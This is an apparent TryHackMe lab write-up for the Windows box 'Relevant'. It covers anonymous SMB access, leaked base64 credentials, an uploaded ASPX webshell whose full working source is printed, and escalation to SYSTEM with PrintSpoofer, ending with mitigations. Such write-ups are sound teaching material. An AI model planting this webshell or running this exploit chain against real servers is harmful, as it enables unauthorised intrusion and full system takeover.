# THM — Relevant

```
██████╗ ███████╗██╗     ███████╗██╗   ██╗ █████╗ ███╗   ██╗████████╗
██╔══██╗██╔════╝██║     ██╔════╝██║   ██║██╔══██╗████╗  ██║╚══██╔══╝
██████╔╝█████╗  ██║     █████╗  ██║   ██║███████║██╔██╗ ██║   ██║   
██╔══██╗██╔══╝  ██║     ██╔══╝  ╚██╗ ██╔╝██╔══██║██║╚██╗██║   ██║   
██║  ██║███████╗███████╗███████╗ ╚████╔╝ ██║  ██║██║ ╚████║   ██║   
╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝
                       TryHackMe — Medium
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Port scan — 80 & 49663 (IIS), 135/139/445 (SMB), 3389 (RDP), 49666/49667 (RPC)
- [x] Listed SMB shares with a null session — found a non-default share, `nt4wrksv`
- [x] Read `nt4wrksv` anonymously; pulled `passwords.txt`
- [x] Base64-decoded two credentials: `Bob` and `Bill`
- [x] Confirmed `Bob` has READ/WRITE on `nt4wrksv`
- [x] Realised the `nt4wrksv` share is served by IIS on port 49663 (`/nt4wrksv/`)
- [x] Uploaded an ASPX webshell via SMB and executed it over HTTP → RCE as `iis apppool\defaultapppool`
- [x] Read `user.txt` directly (the service account can read Bob's desktop)
- [x] `whoami /priv` showed `SeImpersonatePrivilege` enabled
- [x] GodPotato failed to impersonate; PrintSpoofer worked
- [x] Ran a command as `SYSTEM` and read `root.txt`

---

## Tools Used

| Tool | Purpose |
|---|---|
| RustScan / Nmap | Port and service discovery |
| smbclient / smbmap / enum4linux-ng | SMB enumeration and file transfer |
| base64 | Decoding the leaked credentials |
| curl | Driving the ASPX webshell over HTTP |
| A custom C# ASPX webshell | Command execution as the IIS app pool |
| PrintSpoofer | `SeImpersonatePrivilege` abuse for SYSTEM |
| GodPotato | Attempted (failed) impersonation route |

---

## TL;DR

Relevant is a Windows/IIS box with an anonymously readable SMB share, `nt4wrksv`, containing a `passwords.txt` of base64-encoded credentials for `Bob` and `Bill`. The same share is writable by `Bob` **and** is served by IIS on port 49663 as `/nt4wrksv/`, so anything written to the share is reachable (and executable) over HTTP. Dropping an ASPX webshell into the share and requesting it gives command execution as `iis apppool\defaultapppool`. That account holds `SeImpersonatePrivilege`, so PrintSpoofer escalates straight to `NT AUTHORITY\SYSTEM`. The user flag is actually readable from the webshell alone — the service account can read Bob's desktop — so you get `user.txt` before you even escalate.

---

## Introduction

Relevant is a medium-rated Windows machine that chains two very common real-world findings: credentials sitting in a readable file share, and a writable directory that happens to be inside a web root. Neither is exotic; both show up constantly in internal engagements. The nice twist is that the writable SMB share and an IIS virtual directory are the *same folder* on different ports — write over SMB, execute over HTTP. The escalation is the canonical Windows service-account move: any token-holder with `SeImpersonatePrivilege` is one "potato" away from SYSTEM.

---

## Recon

### Port Scan

```bash
rustscan -a 10.48.143.113 --ulimit 5000 -b 500 -t 1500 -- -Pn -sV --reason
```

| Port | Service | Version |
|---|---|---|
| 80/tcp | HTTP | Microsoft IIS httpd 10.0 |
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | microsoft-ds | SMB (Windows Server 2016) |
| 3389/tcp | ms-wbt-server | Microsoft Terminal Services (RDP) |
| 49663/tcp | HTTP | Microsoft IIS httpd 10.0 |
| 49666, 49667/tcp | msrpc | Windows RPC |

Two IIS instances (80 and 49663) and a full SMB stack. OS is Windows Server 2016 Standard (build 14393).

### SMB Shares

```bash
smbclient -L //10.48.143.113/ -N
```

```
Sharename       Type      Comment
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
nt4wrksv        Disk
```

`nt4wrksv` is the only non-default share, so it's the one that was added on purpose. A null session could read it:

```bash
smbclient //10.48.143.113/nt4wrksv -N -c 'dir; get passwords.txt'
```

```
passwords.txt    A    98   Sat Jul 25 20:15:33 2020
```

### The credentials

```bash
cat passwords.txt
# [User Passwords - Encoded]
# Qm9iIC0gIVBAJCRXMHJEITEyMw==
# QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d
echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d
```

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

"Encoded" is not "encrypted" — base64 is reversible by anyone.

---

## Foothold

### Mapping the share to a web path

`Bob`'s credentials gave READ/WRITE on `nt4wrksv` (smbmap confirmed; `Bill` was denied everywhere):

```bash
smbmap -H 10.48.143.113 -u Bob -p '!P@$$W0rD!123'
# nt4wrksv    READ, WRITE
```

The key realisation: the `nt4wrksv` share is also mounted by IIS on port 49663. Requesting the file I'd already seen over SMB, through the high-port IIS, returned it:

```bash
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' http://10.48.143.113:49663/nt4wrksv/passwords.txt
# 200 98
```

Same 98-byte file, now over HTTP. So a file I can **write** over SMB, I can **request** (and have IIS execute) over HTTP.

### Webshell

IIS will run `.aspx`. A first off-the-shelf shell rendered its form but didn't execute cleanly, so I wrote a minimal C# ASPX shell that runs `cmd /c <cmd>` from a `cmd` query parameter:

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e){
  Response.Write("<pre>");
  Process p = new Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + Request["cmd"];
  p.StartInfo.UseShellExecute = false;
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.RedirectStandardError = true;
  p.Start();
  Response.Write(Server.HtmlEncode(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd()));
  Response.Write("</pre>");
}
</script>
```

Upload over SMB, execute over HTTP:

```bash
smbclient //10.48.143.113/nt4wrksv -N -U Bob%'!P@$$W0rD!123' -c 'put cmd.aspx'
curl -s "http://10.48.143.113:49663/nt4wrksv/cmd.aspx?cmd=whoami"
# <pre>iis apppool\defaultapppool</pre>
```

---

## Shell / Initial Access

Command execution as `iis apppool\defaultapppool`. The user flag was readable immediately — the app-pool identity can read Bob's desktop:

```bash
curl -s "http://10.48.143.113:49663/nt4wrksv/cmd.aspx?cmd=type%20C:\Users\Bob\Desktop\user.txt"
# <pre>THM{fdk4ka34vk346ksxfr21tg789ktf45}</pre>
```

Then the privilege check that decides the escalation path:

```bash
curl -s "http://10.48.143.113:49663/nt4wrksv/cmd.aspx?cmd=whoami%20/priv"
```

```
Privilege Name                State
============================= ========
SeChangeNotifyPrivilege       Enabled
SeImpersonatePrivilege        Enabled
SeCreateGlobalPrivilege       Enabled
```

`SeImpersonatePrivilege` is enabled. For an IIS/service account, that's a direct line to SYSTEM.

---

## Escalation Path

`SeImpersonatePrivilege` lets a process impersonate the security token of a client that connects to it. The "potato" family of tools abuse this: they coerce a SYSTEM service into authenticating to a named pipe the attacker controls, capture that token, and launch a process as SYSTEM. On modern Windows with this privilege, **PrintSpoofer** is the reliable choice.

---

## Exploitation

Both tools were uploaded the same way as the webshell — written to `nt4wrksv` over SMB, run through the webshell.

**GodPotato first — it failed to impersonate:**

```bash
curl -s ".../cmd.aspx?cmd=C:\inetpub\wwwroot\nt4wrksv\GodPotato.exe%20-cmd%20%22cmd%20/c%20type%20C:\Users\Administrator\Desktop\root.txt%22"
```

```
[*] UnmarshalObject: 0x80070005
[!] Failed to impersonate security context token
```

`0x80070005` is access-denied during the unmarshal — GodPotato didn't take on this build.

**PrintSpoofer worked:**

```bash
smbclient //10.48.143.113/nt4wrksv -N -U Bob%'!P@$$W0rD!123' -c 'put PrintSpoofer.exe'
curl -s ".../cmd.aspx?cmd=C:\inetpub\wwwroot\nt4wrksv\PrintSpoofer.exe%20-c%20%22cmd%20/c%20type%20C:\Users\Administrator\Desktop\root.txt%22"
```

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

The output of the impersonated command doesn't come back through the webshell's stdout (PrintSpoofer spawns it in a separate process), so I redirected the SYSTEM command's output to a file in the web root and fetched it:

```bash
curl -s ".../cmd.aspx?cmd=C:\inetpub\wwwroot\nt4wrksv\PrintSpoofer.exe%20-c%20%22cmd%20/c%20type%20C:\Users\Administrator\Desktop\root.txt%20%3E%20C:\inetpub\wwwroot\nt4wrksv\out.txt%22"
curl -s "http://10.48.143.113:49663/nt4wrksv/out.txt"
# THM{1fk5kf469devly1gl320zafgl345pv}
```

SYSTEM.

---

## Rabbit Holes

**`Bill`'s credentials.** The second decoded account (`Bill : Juw4nnaM4n420696969!$$$`) authenticated nowhere useful — smbmap returned "Access denied" for every share. Only `Bob` mattered. Two credentials in a file doesn't mean both are live.

**The first off-the-shelf ASPX shell.** The initial webshell I pulled down rendered its HTML form but wouldn't actually run a command through the query string — it expected its own POST fields (`xpath`/`xcmd`), and even then didn't execute in this setup. Writing a tiny purpose-built shell that reads `Request["cmd"]` was faster than fighting someone else's.

**GodPotato.** I tried GodPotato before PrintSpoofer and it failed with `Failed to impersonate security context token` (`0x80070005`). Not every potato works on every build — when one fails at the impersonation step, swap it for another rather than assuming the privilege isn't exploitable.

**Capturing SYSTEM output.** PrintSpoofer's `-c` runs the command in a new process whose stdout doesn't return through the webshell. Redirecting to a file inside the web root (`> out.txt`) and fetching it over HTTP is the simplest way to read the result without a full reverse shell.

---

## Flag

| Flag | Value |
|---|---|
| user.txt | `THM{fdk4ka34vk346ksxfr21tg789ktf45}` |
| root.txt | `THM{1fk5kf469devly1gl320zafgl345pv}` |

---

## Mitigations

**Anonymous SMB access.** `nt4wrksv` was readable (and, with weak creds, writable) without real authentication. File shares should require authentication, and non-default shares holding anything sensitive should never allow null/guest sessions.

**Credentials in a share.** A `passwords.txt` on a readable share is game over, and base64 is not protection — it's an encoding anyone reverses in one command. Secrets do not belong in file shares in any form.

**Writable directory inside a web root.** The same folder being both an SMB share with write access and an IIS virtual directory meant uploaded files could be executed as code. Web roots must never be writable by untrusted users, and application directories should have script execution disabled unless required.

**`SeImpersonatePrivilege` on a reachable service account.** The IIS app-pool identity having `SeImpersonatePrivilege` is what turns RCE into SYSTEM. This privilege is required by some service accounts, so the real control is not letting an attacker reach code execution as that account in the first place (see the points above), plus keeping the host patched.

**Weak, reused-style passwords.** `!P@$$W0rD!123` is exactly the kind of "complex-looking" password that falls to a wordlist. Enforce length-based passphrases and screen against breach lists.

---

## Key Takeaway

The whole foothold hinges on one observation: a writable SMB share and an IIS virtual directory were the same folder. Write a file over SMB on 445, execute it over HTTP on 49663. Whenever you find a writable share on a Windows web server, the immediate question is "is this folder also served by the web server?" — because if it is, write access becomes code execution.

The escalation is the Windows reflex worth having memorised: on any service or IIS account, run `whoami /priv` first. `SeImpersonatePrivilege` = reach for a potato (PrintSpoofer, then others if it fails). It converts "I can run code as a low-priv service account" into SYSTEM almost every time.

---

## If I Did It Again

Check whether a writable share is web-served *before* writing anything else — one `curl` to `:49663/nt4wrksv/passwords.txt` confirmed the SMB-to-HTTP bridge in seconds and told me the whole plan.

Skip GodPotato and go straight to PrintSpoofer on this build; I lost a couple of minutes to GodPotato's impersonation failure. When a potato fails at `UnmarshalObject` / impersonation, don't debug it — switch tools.

Write my own three-line ASPX shell from the start instead of downloading one; it reads `Request["cmd"]`, executes, and returns output with no fighting someone else's form fields.

---

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-11-16 | Initial writeup |

---

<a name="top"></a>[↑ Back to top](#table-of-contents)
